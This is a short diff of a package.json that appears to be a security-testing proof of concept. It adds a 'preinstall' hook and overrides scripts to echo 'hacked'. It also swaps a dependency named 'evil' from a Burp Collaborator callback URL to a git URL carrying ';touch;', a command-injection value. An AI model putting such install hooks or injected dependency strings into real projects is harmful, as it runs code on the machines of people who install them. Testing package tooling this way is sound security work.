@@ -10,10 +10,10 @@
     "test": "echo test is hacked",
     "npm": "echo npm is hacked",
     "node": "echo node is hacked",
-    "postinstall":"echo install HACKED"
+    "preinstall":"echo install HACKED"
   },
   "dependencies": {
-    "evil":"git+https://0efsk7euj72t55brus0wpa470y6pue.burpcollaborator.net/ok"
+    "evil":"git+https://github.com/No1zy/a;touch;"
   },
   "repository": {
     "type": "git",
